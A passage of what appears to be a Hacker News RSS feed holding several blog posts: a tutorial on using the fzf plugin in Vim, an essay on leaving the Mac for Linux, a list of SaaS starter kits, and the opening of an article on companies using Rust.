https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/1c72d/cover.jpg 590w,
https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/a8a14/cover.jpg 885w,
https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/fbd2c/cover.jpg 1180w,
https://pragmaticpineapple.com/static/d844e61d88396079b127a2cb42ebe966/ca2d0/cover.jpg 5776w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>

<p>If you never heard of <a href="https://github.com/junegunn/fzf">fzf</a>, it is a very
handy general-purpose command-line fuzzy finder. Besides command-line, it is
also a popular Vim plugin. If you’re wondering, a fuzzy finder is a tool that
helps you find what you’re looking for without needing to write the full name.</p>
<p>As a Vim user, I am always obsessed with doing a thing in the fewer keystrokes
as possible. Having the ability to open a file in Vim quickly is super useful to
me, and you will see why soon.</p>
<p>But, did you know that this fuzzy finder - fzf, can do a lot more than you
thought? Oh yeah, the fuzzy search is just the tip of the iceberg here.
It is like wine; the more you leave it on your computer, the more flavor and
sweetness it accumulates from that command-line. Let’s dive in and find out how
you can increase your productivity with fzf inside Vim.</p>
<h2 id="starting-off"><a href="#starting-off" aria-label="starting off permalink"></a>Starting off</h2>
<p>To be able to do the things I am doing in this blog post, you will need a couple of
plugins. If you’re not using <a href="https://github.com/junegunn/vim-plug">vim-plug</a>
for installing other Vim plugins, then you are missing out. Go ahead and set
that up, and you can add the following:</p>
<div data-language="vim"><pre><code>Plug <span>'junegunn/fzf'</span><span>,</span> <span>{</span> <span>'do'</span><span>:</span> <span>{</span> <span>-</span><span>&gt;</span> fzf#<span>install</span><span>(</span><span>)</span> <span>}</span> <span>}</span>
Plug <span>'junegunn/fzf.vim'</span></code></pre></div>
<p>Then, install these plugins with <code>:PlugInstall</code> or use this shortcut I use:</p>
<div data-language="vim"><pre><code>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>1</span> <span>:</span><span>source</span> ~<span>/</span><span>.</span>vimrc \| <span>:</span>PlugInstall<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>You can then press your leader key and number 1 to install and apply all the
changes in your <code>.vimrc</code>.</p>
<p>Now, to the coolest part!</p>
<h2 id="the-magic-finder"><a href="#the-magic-finder" aria-label="the magic finder permalink"></a>The magic finder</h2>
<p>Everything we need is installed, and we can get to the practical part. As we
said before, fzf is a fuzzy finder, a file selector if you want. Let’s try
out that feature right off. To get the file picker opened, type <code>:Files</code> in
a Vim session. You should get something like this:</p>
<p><span>
      <span></span>
  <img alt="Open :Files" title="Open :Files" src="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/fcda8/open-files.png" srcset="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/12f09/open-files.png 148w,
https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/e4a3f/open-files.png 295w,
https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/fcda8/open-files.png 590w,
https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/efc66/open-files.png 885w,
https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/c83ae/open-files.png 1180w,
https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/ab40b/open-files.png 1736w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>What happened is fzf opened a small window at the bottom showing files in our
directory. If you look at the newly opened window, you will see the list of
files, and the <strong>preview</strong> of the currently selected file on the right
of the window. So you got your files on the left and their preview on the
right. Are you already impressed as I was? Cool, let’s move on.</p>
<p>If you don’t like the window, you can fine-tune easily with fzf customization
options. But if you want any fzf command in fullscreen, you can append <code>!</code> at
the end of the command. For example, let’s do <code>:Files!</code> and you should see the
following:</p>
<p><span>
      <span></span>
  <img alt="Open :Files! in fullscreen" title="Open :Files! in fullscreen" src="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/fcda8/open-files-fullscreen.png" srcset="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/12f09/open-files-fullscreen.png 148w,
https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/e4a3f/open-files-fullscreen.png 295w,
https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/fcda8/open-files-fullscreen.png 590w,
https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/efc66/open-files-fullscreen.png 885w,
https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/c83ae/open-files-fullscreen.png 1180w,
https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/e67a8/open-files-fullscreen.png 1740w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>But, I don’t use <code>:Files</code> that often. As a matter of fact, I only use
<code>:GFiles</code> command by fzf. <code>:GFiles</code> will open a file picker for your Git files,
ignoring ones in the <code>.gitignore</code>. Using it is pretty neat in JavaScript
projects where <code>node_modules</code> files tend to kill the mood when running
<code>:Files</code>. Let us compare the same project with <code>:Files</code> and <code>:GFiles</code> commands:</p>
<p><span>
      <span></span>
  <img alt=":Files in a JavaScript project" title=":Files in a JavaScript project" src="https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/fcda8/files-js-project.png" srcset="https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/12f09/files-js-project.png 148w,
https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/e4a3f/files-js-project.png 295w,
https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/fcda8/files-js-project.png 590w,
https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/efc66/files-js-project.png 885w,
https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/c83ae/files-js-project.png 1180w,
https://pragmaticpineapple.com/static/7b9132a9a4e78a2fc2087e4059a22cbf/e67a8/files-js-project.png 1740w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>
  Yuck! `node_modules` everywhere.
</p>
<p><span>
      <span></span>
  <img alt=":GFiles in a JavaScript project" title=":GFiles in a JavaScript project" src="https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/fcda8/git-files-js-project.png" srcset="https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/12f09/git-files-js-project.png 148w,
https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/e4a3f/git-files-js-project.png 295w,
https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/fcda8/git-files-js-project.png 590w,
https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/efc66/git-files-js-project.png 885w,
https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/c83ae/git-files-js-project.png 1180w,
https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/76435/git-files-js-project.png 1742w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>
  Ah, that's better.
</p>
<p>Notice the difference? It feels like I just dropped a heavy backpack off my
back by not having those <code>node_modules/**</code> files popping up. Anyway, let’s see
this bad boy in action when searching for files to edit.</p>
<p><img src="https://pragmaticpineapple.com/5a84a887e91f3aea28f8692bcc518fc0/gfiles-in-action.gif" alt=":GFiles in action GIF"></p>
<p>That’s it, and it is looking pretty good. Only thing I dislike about using <code>:GFiles</code> is
that it won’t include your new files unless you add them to the Git index with
<code>git add</code>. Also, I’d like some syntax highlighting to be there out of the box
when previewing files, but we will cover that in another blog post. In the
meantime, consider subscribing to the <a href="https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/newsletter">newsletter</a> to get similar
posts like this.</p>
<p>To sum up, fzf is useful and quick as a flash when searching for files. And, as
Drake below says, resort to using <code>:GFiles</code> or try to configure <code>:Files</code> to
ignore certain files and paths.</p>
<p><span>
      <span></span>
  <img alt="Drake fzf choices - go with :GFiles instead of :Files" title="Drake fzf choices - go with :GFiles instead of :Files" src="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/41099/drake-no-files-yes-gfiles.jpg" srcset="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/a80bd/drake-no-files-yes-gfiles.jpg 148w,
https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/1c91a/drake-no-files-yes-gfiles.jpg 295w,
https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/41099/drake-no-files-yes-gfiles.jpg 500w" sizes="(max-width: 500px) 100vw, 500px" loading="lazy">
    </span></p>
<p>To make this super fast for you, you can create a shortcut. I open <code>:GFiles</code>
with CTRL + p. I got left with this in my muscle memory from the legendary
<a href="https://github.com/kien/ctrlp.vim">ctrlp</a> plugin. To have <code>:GFiles</code> wired
up, so it opens with CTRL + p, you can add the following to your <code>.vimrc</code>:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span>C<span>-</span><span>p</span><span>&gt;</span> <span>:</span>GFiles<span>&lt;</span>Cr<span>&gt;</span></code></pre></div>
<h2 id="speed-search-your-project"><a href="#speed-search-your-project" aria-label="speed search your project permalink"></a>Speed search your project</h2>
<p>What blows my mind from time to time is other things you can do with fzf in
Vim. For example, you can use
<a href="https://github.com/ggreer/the_silver_searcher">The Silver Searcher</a>
or
<a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> with fzf.
To search with The Silver Searcher, type <code>:Ag</code> and a term you want to
search. And, to search with ripgrep, type <code>:Rg</code> and the term. Of course, to
have these commands work, you need the respective libraries installed in your
environment.</p>
<p>I use <code>:Ag</code>, and it performs wonderfully. It is wired to CTRL + g for me,
so I access it quickly. To have this or a similar setup, add the following
to your <code>.vimrc</code>:</p>

<p>The shortcut above will open up the <code>:Ag</code> search windows at the bottom with the
preview of the file. I find it super helpful and quick when I need to search
for a word in a project. Let’s see <code>:Ag</code> in action.</p>
<p><img src="https://pragmaticpineapple.com/0c1dc6a8efd411223955dd76a20783a6/ag-in-action.gif" alt=":Ag in action"></p>
<h2 id="buffed-up"><a href="#buffed-up" aria-label="buffed up permalink"></a>Buffed up</h2>
<p>You can search all your open buffers with fzf by typing <code>:Buffers</code>. I keep a
shortcut at my leader key (the Space key, BTW) + b. Like so:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>l</span> <span>:</span>Buffers<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>With that command, you will get a buffers explorer where you can quickly switch
between open files. I hope that helps. Let’s see how it looks:</p>
<p><span>
      <span></span>
  <img alt=":Buffers in action" title=":Buffers in action" src="https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/fcda8/buffers.png" srcset="https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/12f09/buffers.png 148w,
https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/e4a3f/buffers.png 295w,
https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/fcda8/buffers.png 590w,
https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/efc66/buffers.png 885w,
https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/c83ae/buffers.png 1180w,
https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/50e7d/buffers.png 1738w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<h2 id="ascii-art-kind-of"><a href="#ascii-art-kind-of" aria-label="ascii art kind of permalink"></a>ASCII art (kind of)</h2>
<p>If you are a fan of drawing inside the terminal, then you are going to love this one.
Try typing <code>:Commits</code> if you are using the <a href="https://github.com/tpope/vim-fugitive">vim-fugitive</a> plugin.
The plugin by itself is a pretty awesome wrapper around Git, just if you
never want to leave the warmth of your Vim session. Anyways, if you type
<code>:Commits</code> you should get a tree of your project commits like so:</p>
<p><span>
      <span></span>
  <img alt="Commit art" title="Commit art" src="https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/fcda8/commits-art.png" srcset="https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/12f09/commits-art.png 148w,
https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/e4a3f/commits-art.png 295w,
https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/fcda8/commits-art.png 590w,
https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/efc66/commits-art.png 885w,
https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/c83ae/commits-art.png 1180w,
https://pragmaticpineapple.com/static/4cef7957e6047955944c695930e80804/ab40b/commits-art.png 1736w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>Pretty cool, huh? You can scroll up and down and checkout changes at each
commit. You can even enter the commit you are interested in and check out
changes made there. All of this is possible thanks to the <code>vim-fugitive</code>, so check
it out. A blog post about using Git inside Vim is coming, so be sure to
subscribe to the <a href="https://pragmaticpineapple.com/newsletter">newsletter</a>.</p>
<h2 id="a-quick-summary"><a href="#a-quick-summary" aria-label="a quick summary permalink"></a>A quick summary</h2>
<p>Vim ecosystem has a lot of plugins, and fzf is one great plugin. You can search
for files with <code>:GFiles</code> and <code>:Files</code>. If you want to do a text search, try using
<code>:Ag</code> or <code>:Rg</code>, which use The Silver Searcher and ripgrep, respectively. Tired of
slow switching between open buffers - try out <code>:Buffers</code>. Or, if you want some
nice commit information, do <code>:Commits</code>.</p>
<p>These are just a couple of commands and tricks fzf has, be sure to check out
their README for more information. Also, stay tuned for more posts like these
from me and consider subscribing to the <a href="https://pragmaticpineapple.com/newsletter">newsletter</a>. If you found
the blog post interesting, make sure to spread the word and share it with
your friends and coworkers:</p>
<blockquote><p lang="en" dir="ltr">I just released a new blog post about using the fzf plugin with Vim. Check it out 👇<a href="https://t.co/fmybAXNNnx">https://t.co/fmybAXNNnx</a></p>— Nikola Đuza (@nikolalsvk) <a href="https://twitter.com/nikolalsvk/status/1328670506803924992?ref_src=twsrc%5Etfw">November 17, 2020</a></blockquote> 
<blockquote>
<p>💡 Are you curious to learn Vim in the most effective way possible? Then check out
the <a href="https://gumroad.com/a/561247347">Mastering Vim Quickly</a> book.</p>
</blockquote>
<p>Until the next one, cheers!</p></section></div>]]>
            </description>
            <link>https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25137793</guid>
            <pubDate>Wed, 18 Nov 2020 15:28:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mac Is Losing Me]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25136659">thread link</a>) | @mplanchard
<br/>
November 18, 2020 | https://underjord.io/the-mac-is-losing-me.html | <a href="https://web.archive.org/web/*/https://underjord.io/the-mac-is-losing-me.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-18</small>
        <p>I’ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
<p>I got it primarily on recommendation from a friendly hacker who’s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>I’ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then I’ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in it’s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions I’ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developer’s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didn’t miss Linux at all. I’ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain I’ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that I’ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>That’s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. I’ve had some keys getting stuck but fixable with canned air. I don’t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I don’t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the “don’t charge it on the wrong side” problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As I’ve been using these devices it has become increasingly annoying to figure out how to install “unknown” apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. There’s always a new piece getting locked down. And while I think that’s often to the benefit of the average consumer, I’m not that. And I just get more annoyed.</p>
<p>I’ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I don’t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasn’t finalized. Woof, aside from running Windows as a dev environment which I didn’t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I can’t get a Ryzen, I can’t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesn’t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesn’t make any kind of sense for me and what I do. I can’t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I don’t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. I’m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I don’t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Don’t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So what’s next?</h2>
<p>With my office in the garage as my primary work location I’m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>I’m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But I’m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just don’t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasn’t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So I’ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>I’m not happy about it. I’ve generally enjoyed using my Macs. But when someone says “we’ll give you the full experience”, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, I’m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It don’t track. Thanks for reading.</p>

    </article></div>]]>
            </description>
            <link>https://underjord.io/the-mac-is-losing-me.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25136659</guid>
            <pubDate>Wed, 18 Nov 2020 13:49:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boilerplates for a Head Start When Building a SaaS App]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25136653">thread link</a>) | @jakeprins
<br/>
November 18, 2020 | https://jakeprins.com/blog/7-boilerplates-for-a-head-start-when-building-a-saas-app | <a href="https://web.archive.org/web/*/https://jakeprins.com/blog/7-boilerplates-for-a-head-start-when-building-a-saas-app">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>Building a SaaS platform is hard, especially if you’re a solo founder who needs to build everything by yourself. But there are options to help you build and launch your project faster.</p><hr><p>When you have a great idea and start working on it from scratch, you feel a rush of excitement. It’s great to work on an interesting idea, but instead of focusing on what makes your product unique, you first need to put in the hours to work on things that are less exciting: configuring a project, building authentication flows, integrating payments, building forms, etc.</p><p>If you want to launch faster, there are some things you might want to consider. You probably want to use a web framework to increase development speed. Nobody builds their SaaS with plain Ruby code. You’d much rather use a framework like Rails. And the same goes for styling your application. Instead of writing all the CSS yourself, you could use a framework like Bootstrap, Material, or Tailwind. But if you really want to save a lot of time, you should start with a SaaS boilerplate.</p><p>A SaaS boilerplate includes a lot of functionalities that cost a lot of time to build out yourself. Think about authentication or billing. These are things that every SaaS needs to have, so why build it all yourself?</p><p>You should launch your SaaS fast so you can get feedback as soon as possible. To do that, starting out with a boilerplate/starter kit can save you tons of time. Here is a list of seven boilerplates that could help you build your SaaS faster.</p><hr><h3>Serverless SaaS</h3><p>The <a href="https://serverless.page/">Serverless SaaS</a> boilerplate is the perfect starting point for your next React app. It’s built with TypeScript, Next.js, Tailwind, and Firebase. You can tap into user authentication, payments with Stripe, teams, and more with zero effort.</p><p>Going serverless is a great way of cutting costs because the pay-as-you-go pricing model means you can start free and only pay when your startup gets real traction. You also don’t have to worry about scaling issues. With Serverless platforms you are outsourcing a lot of responsibilities which allows you to move quicker.</p><p>That makes this starter kit great for solo developers and small teams who want to launch something quickly without spending money.</p><img alt="Serverless SaaS logo and slogan" src="https://miro.medium.com/max/700/1*7yHuIcpwIcUBkecK2LORMg.jpeg"><p>Source: <a href="https://serverless.page/">https://serverless.page/</a></p><hr><h3>Jumpstart</h3><p><a href="https://jumpstartrails.com/">Jumpstart</a> is a great starter kit for your next Ruby on Rails app. You can skip the boilerplate set up and build your Rails app faster. It handles all the stuff you need like a user authentication system and even background processing. It also has very good <a href="https://jumpstartrails.com/docs">documentation</a>. You can even try out a <em>lite</em> version that is available for free on <a href="https://github.com/excid3/jumpstart">Github</a>.</p><img alt="Jumpstart home page" src="https://miro.medium.com/max/700/1*8vcaD5txgZRmwqHrxMPvUQ.png"><p>Source: <a href="https://jumpstartrails.com/docs">https://jumpstartrails.com</a></p><hr><h3>Laravel Spark</h3><p><a href="https://spark.laravel.com/">Laravel Spark</a> is a Laravel package that is built by Taylor Otwell, the creator of Laravel. An amazing project to help you build your next great product with PHP. It provides a lot of scaffolding features so you don’t have to code everything yourself. It also has the features that every SaaS business needs, like (two-factor) authentication, subscription billing, and invoices.</p><img alt="Spark logo" src="https://miro.medium.com/max/700/1*OIiJ6wMYQE3XFx48b7NWvw.png"><p>Source: <a href="https://spark.laravel.com/">https://spark.laravel.com/</a></p><hr><h3>Gravity</h3><p>With Gravity, you can build a Node.js and React SaaS app at warp speed. It comes with a lot of features and pre-built components to get you up and running quickly. It even has a built-in user-onboarding flow feedback widget.</p><img alt="Gravity home page" src="https://miro.medium.com/max/700/1*2R71R0rWY_9N8I2wnrAfVA.png"><p>Source: <a href="https://usegravity.app/">https://usegravity.app</a></p><hr><h3>Sjabloon</h3><p><a href="https://www.getsjabloon.com/">Sjabloon</a> is a modern Ruby on Rails SaaS starter kit that also includes all the SaaS features like authentication and payments with Stripe, but also comes with a huge UI components library that is built with Tailwind, the rising CSS framework. This allows you to focus on your core product right from the start. Just like Jumpstart, it also has a lite version that is available for free on <a href="https://github.com/GetSjabloon/sjabloon-lite">Github</a>.</p><img alt="Sjabloon home page" src="https://miro.medium.com/max/700/1*cDQ56JMFLiPsqdiDPmjlkg.png"><p>Source: <a href="https://www.getsjabloon.com/">https://www.getsjabloon.com/</a></p><hr><p>React Milkshake</p><p><a href="https://www.reactmilkshake.com/">React Milkshake</a> is a basic React boilerplate to build high-performance apps faster. It does not come with as many features as the other boilerplates mentioned, but it does come with a code generator that generates components and <a href="https://redux.js.org/">Redux</a> code. If you are using Redux as a state management tool, using this boilerplate will save you a lot of time.</p><img alt="React Milkshake home page" src="https://miro.medium.com/max/700/1*GfuUSjr7h6tkB6YQZqWGEQ.png"><p>Source: <a href="https://www.reactmilkshake.com/">https://www.reactmilkshake.com</a></p><hr><h3>Wave</h3><p>Voyager is a popular Laravel Admin Package and <a href="https://wave.devdojo.com/">Wave</a> is a starter kit built on top of both Laravel and <a href="https://voyager.devdojo.com/">Voyager</a>. You can install this starter-kit on your own server and customize it to fit your needs. Wave integrates with both Stripe or Braintree and is well documented. It also has theme support for three different starter themes. You can choose from Bootstrap, UIKit, or Tailwind. Wave also checks all the boxes for all the other SaaS features so it will much likely speed up your development time when crafting a SaaS from scratch.</p><img alt="Wave home page" src="https://miro.medium.com/max/700/1*1dYotspAZBJ9xXBFGIaLSQ.png"><p>Source: <a href="https://wave.devdojo.com/">https://wave.devdojo.com</a></p><hr><p>Thanks for reading! I hope you find these helpful.</p></article></div></div>]]>
            </description>
            <link>https://jakeprins.com/blog/7-boilerplates-for-a-head-start-when-building-a-saas-app</link>
            <guid isPermaLink="false">hacker-news-small-sites-25136653</guid>
            <pubDate>Wed, 18 Nov 2020 13:49:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A website showing/updating surveillance cameras (OpenStreetMap-based)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25136345">thread link</a>) | @pietervdvn
<br/>
November 18, 2020 | https://pietervdvn.github.io/MapComplete/surveillance.html?z=17&lat=51.5004&lon=0.029107# | <a href="https://web.archive.org/web/*/https://pietervdvn.github.io/MapComplete/surveillance.html?z=17&lat=51.5004&lon=0.029107#">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://pietervdvn.github.io/MapComplete/surveillance.html?z=17&amp;lat=51.5004&amp;lon=0.029107#</link>
            <guid isPermaLink="false">hacker-news-small-sites-25136345</guid>
            <pubDate>Wed, 18 Nov 2020 13:13:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[9 Companies That Use Rust in Production]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25136222">thread link</a>) | @NaeosPsy
<br/>
November 18, 2020 | https://serokell.io/blog/rust-companies | <a href="https://web.archive.org/web/*/https://serokell.io/blog/rust-companies">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you haven’t yet heard, Rust is one of the most promising and <a href="https://insights.stackoverflow.com/survey/2020#most-loved-dreaded-and-wanted">most loved</a> programming languages out there.</p><p>First created at Mozilla, it has since been adopted by companies like Dropbox, Microsoft, Facebook, and others. Rust’s main benefit is that it enables C-like performance while still keeping the memory safety that we are used to when developing with languages like JavaScript and Python.</p><p>In this article, I will look at nine large companies that use Rust and delve into the reasons for their choice.</p><h2 id="9-rust-success-stories">9 Rust success stories</h2><h3 id="dropbox">Dropbox</h3><p><img src="https://serokell.io/files/4b/4b69p1dn.dropbox_(1).jpg" alt="Dropbox uses Rust" loading="lazy"></p><p><a href="https://www.dropbox.com/">Dropbox</a> uses Rust for parts of its file synchronization engine. Since the engine is highly concurrent, writing, testing, and debugging it is hard. Therefore, the team chose to rewrite it in Rust. Rust’s static types and heavy compile-time checks give it an advantage over dynamically typed languages like Python when you need to tackle complex codebases and concurrent code.</p><blockquote>
